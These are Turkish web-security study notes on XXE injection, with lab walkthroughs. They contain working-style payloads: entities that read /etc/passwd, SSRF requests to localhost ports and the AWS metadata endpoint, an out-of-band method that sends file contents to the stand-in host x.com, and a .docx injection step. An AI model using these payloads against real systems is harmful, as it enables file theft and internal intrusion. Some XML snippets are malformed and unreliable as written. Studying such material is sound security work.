<h1 align="center">XXE Injection</h1>

## XXE Nasıl Tespit Edilir?
Bu DOCTYPE kodunu ver adama, sana geri DNS çözümlemesi veya GET isteği geliyorsa XXE vardır.
![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/69c5e371-8242-4f10-953b-f43ea133ee9d)

## XML Nedir?
XML’in bize temelde sağladığı şey şudur: Verileri formatlı bir şekilde tutabilmeni sağlıyor. HTML’den özelleşmiş bir şey aslında bu. O yüzden buradan örnek verildi.
![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/2a3f3fa2-7282-4e90-aaab-0c1d4ab7539f)
XML’i günümüzde yazılımcıların kodları içerisinde aktif bir şekilde kullandığı bir pek yapı yok. Başka servislerle etkileşimlerde kullanılıyordu fakat artık yerini JSON’a bıraktı. Bir datayı export ederken, structural tuttuğun bir veriyi, başka bir ortama taşırken kullandığın yapı formatı. (Web app olur) Servislerin ve programların veri alışverişinde kullandığı ortak bir dil.
![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/6c09f43a-1c34-4696-b34a-fdd96f7d7390)
- Uygulamaya dış dünyadan gelen veriler “*input*” ise başka bir servisten gelen data da “input” tur.
    - Bu servis XML’i aldığında parse etmesi lazım. Derseniz ki input validation yapalım, bunun için önce parse etmeniz lazım.
    - Bizim hedeflediğimiz kısım ise programlama dilinin parsing yaptığı kısım ve an.
- Adam XML verisini SQL sorgusunda kullanıyor ise, SQLi aramaya devam et. Şu şekilde mesela:
![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/da9d792f-369a-4a01-b976-b88e657c626c)
- XML’i parse edip DB’ye kaydedip, o verileri sana başka bir ekranda sunuyor ise burada Stored XSS bakabilirsin.
- Database tabloları üzerindeki verileri isabetli bir şekilde iletebilmek istediğin zaman XML’de DTD(Document Type Definition) isimli bir yapıyla karşılaşıyorsun.
- XML için class oluşturur gibi DOCUMENT type oluşturuyorsun :
```xml
Bu oluşturduğun dökümanı XML structure içine import edersen 

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note SYSTEM "Note.dtd"> --> Bu kısım import etmek (External Document Type Definition)
<note>
<to>Tove</to>
<from>Jani</from>
<heading>Reminder</heading>
<body>Don't forget me this weekend!</body>
</note>
```
`<!DOCTYPE note SYSTEM "Note.dtd">` kısmı şunu söylüyor: Bu dosya ile aynı lokasyonda bulunan Note.dtd adında döküman tanım formatına git; içeriğini oku, bu dosyanın içeriğindeki “note” yapısını o şekilde tanımlıyor olacağım.
```xml
DATABASEin şemasını kullanan programlama tanımı yapmış oluyorsun.
<!DOCTYPE note
[
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
]>
```
- Bu dökümanın tipi : note
- Bu notun elementleri : to,from,heading,body
- Bu elementlerin tipleri de str, int gibi şeyler olacak yanlarında yazıyor.

- XML parser, kendine bir XML geldiğinde önce direktiflere bakıyor: Benim DOCTYPE, yani döküman tipi, bir tanımı yapıyorum ve bunun adı da “note” imiş. Bana bir SYSTEM operandını söylemiş, bu bir işlemin adı. SYSTEM operandının yaptığı işlem ise External DTD’dir, bu dosyayı parse etmeden önce verilen dosyayı gider önce okur ve okuduğu dosyayı “note” adındaki objeyi oluşturmak için kullanır.
- `<!DOCTYPE note SYSTEM "Note.dtd">` Bu kısımda "Note.dtd" dosyasını gidip okuyor. Yani bu demek oluyorki local sistem dosyalarından birini okutma kapasitesine sahibim.
----
- Bu adama string ifade vererek de XML document oluşturabilirsin sıkıntı olmaz. İlle de gidip SYSTEM ile include etmene gerek yok. Gidip şu şekilde element tanımı yapabilirsin:
- `<!DOCTYPE note [<!ELEMENT note (to,from,heading,body)]> `
- DTD içine "Entity" yazma olanağı sağlar. String ifadeler yazabilirsin yani şu şekilde:
```xml
<!ENTITY writer "Donald Duck.">
<!ENTITY copyright "Copyright W3Schools.">

XML içerisinde referansı ile çağırabiliyorsun:
<author>&writer;&copyright;</author>
```
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [<!ENTITY writer "Donald Duck."]> 
<note>
<to>&writer;</to> --> Donald Duck yazacak.
<from>Jani</from>
<heading>Reminder</heading>
<body>Don't forget me this weekend!</body>
</note>

 ** Entity nin güzel özelliklerinden biri SYSTEM operandına erişme özelliği barındırması.
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [<!ENTITY writer SYSTEM "http://x.com/"]> yaptırtabiliyorsun.
```
- Entity nin güzel özelliklerinden biri SYSTEM operandına erişme özelliği barındırması.
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [<!ENTITY writer SYSTEM "http://x.com/"]>
```
yaptırtabiliyorsun ve burada hacker bakış açısı devreye giriyor.
- “writer”ın içeriği SYSTEM operandı ile dışarıdaki kaynaklara erişim imkanı sağlıyor. Parser bunu görünce x.com’a HTTP ile bir GET requesti üretir.
#### Her XML gördüğünde heyecanlanma!! Web application senden XML requestini aldıktan ne yapıyor çokomelli!!! SQL sorgusu mu yapıyor başka bir şey mi yapıyor??

## Lab: Exploiting XXE using external entities to retrieve files
- Lab’da /etc/passwd dosyasını okumamız isteniyor. “Check stock” özelliği XML parse ediyormuş.
- Bu yapıda kullanıcıdan gelen inputu alıp, gidiyor SQL sorgusunda kullanıyor ve sana bunun responsunu dönüyor, öncelikle bunu keşfettik. Burada SQLi arayabilirsin. Fakat burada input validation yapmış integer değer istiyor.
- Syntaxı bozarak error vermesini sağla, erroru geri dönüyor ise istediğin içeriği bu error’un içinde getirt. Error based SQLi gibi.
- < Bu şekilde hata verecektir
![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/b0d6df96-76b5-4bd4-9af7-3f6263e12c35)
- `<!DOCTYPE note [<!ENTITY writer SYSTEM "file:///etc/passwd"]>` http yazarsan http req. yollar file yazarsan file handler diye bir protokolü kullanarak dosyanın içeriğini okumaya çalışır.
![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/f8943fe2-d089-477c-910d-aec4f8a5392c)
- 2 yazan yere askfaskhjfasjk yazsan bile hatada sana bunu döndürdüğü için hackleyebildin.
-----
- `<!DOCTYPE note [<!ENTITY writer SYSTEM "http://127.0.0.1:9002/"]>`
    - Bu şekilde portları gezerek sunucu üstünde çalışan servislere erişim sağlayabilirsin.
    - Sunucu üstünde çalışan Elastic Searche http isteği ürettirebiliyorsun. SSRF zaafiyeti ortaya çıkıyor.
    - Böylece parser’a istediğin yere http requesti yollatabilirsin. Local IP’yi öğrendikten sonra iç ağı tarayabilirsin, portlarını taratırsın…
-----
## Lab: Exploiting XXE to perform SSRF attacks
- http://169.254.169.254/latest/metadata  —> EC2 lar bu URL’e erişim imkanına sahip. Burada EC2’nun kritik bilgileri yatıyor. AWS kendi otomatik cevap dönüyor buradan.
- Bir önceki labda olduğu gibi “Check stock” özelliği XML parse ediyormuş ve bu şekilde gizli bilgilere erişim sağlama imkanımız oldu.
![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/7a4c3dda-befd-4c9f-a3e2-9e808854ae04)

## XXE Out of Band Trick
![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/84811cd5-fed2-43c2-addc-e96f713381a2)
- x.com’a gitse istek atsa ve oradan gelen cevap da XML olsa ve Web app. bunu işlemeye devam etse çok şahane şeyler olur.
- txt yerine xml dosyası okuttuğunda <> işaretlerini tag olarak algılayacak ve hata verecektir muhtemelen ve sana geri print edemeyecek. Encode özelliği olmadığı için encode da yapamazsın. Peki bunu nasıl aşıcaz? :
    - İlk isteğimiz ile servis x.com’a gidecek, sonra x.com’dan creds.xml’i okutacağız sonra bu dosyanın içeriğini bir GET requesti ile ve bir “p” parametresi ile x.com’a göndereceğiz. Böylece x.com’a gelen 2. GET requestinin URL’inde geçen parametre dosyanın içeriği olmuş olur.
![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/5491e334-4620-4f81-bdae-53a2864be1bc)
- Bu kısımda uygulamanın beklediği users taglarini falan yazabilirsin:
![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/bf087b44-56cb-471d-adc2-8b59c5e568bf)
- Payloadımız şu şekilde çalışacak sırasıyla:
1. [x.com](http://x.com)/test.dtd üzerinde bir dosya var git onu al ve gelen değerler ne ise onları o şekilde XML parser içerisine ver diyoruz burda. 
2. [x.com](http://x.com)/test.dtd ’ye istek atıp dosyayı almaya gidiyor. 
3. Gelen isteğe cevaben “settings.xml” dosyasını oku ve “payl” değişkenine koy diyoruz. Ardından 2. entity kısmına geliyor, x.com’a bir GET requesti gönder ama bu sefer “p” parametresiyle birlikte. “p” parametresinin içerisinde ise az önce okuduğun .xml dosyasındaki değer olacak. 
4. Bunu gören XML parser, tagleri sırasına göre işleyip settingsi okuyor. 
5. Sana cevap olarak geri x.com’a GET isteği atıyor. Sana gelen isteğin URL içeriğinde okunan dosyanın içeriğini görüyor olursun. Peki bu nasıl mümkün oluyor?: Remote tagi ile parse edilen “int” ve “trick” taglerini de cevaben bize ver diyoruz.
![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/b6358e37-8104-4758-9cbe-32828ebf8fde)
### Sunucu Dışarı Çıkamazsa Ne Yapıcaz?
- Doğrudan yapabileceğin pek bir şey yok. Olayı SSRF’e çevirip içerden bir şeyler yapman gerekiyor ki bu da blind SSRF olacaktır. Gerçekten zor bir konu.

### XLST parsing mevzusu var
- Bir web app .docx .xlst alıyorsa senden bunu parse etmek için “unzip” yapması gerekiyor. [Content_Types].xml dosyasına :
`<!DOCTYPE foo [<!ENTITY xxe123 SYSTEM "http://127.0.0.1:8000/"]>`
kodunu ekle sonra
```
zip -u test.docx \[Content_Types\].xml
```
kodu ile updatelersin ve sunucuya yollarsın.

## Mitigation
- Peki XXE nasıl engellenir? Tabii ki tek satırlık bir kod ile.
![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/82455dfe-aef6-4093-8d51-0947c4b44790)
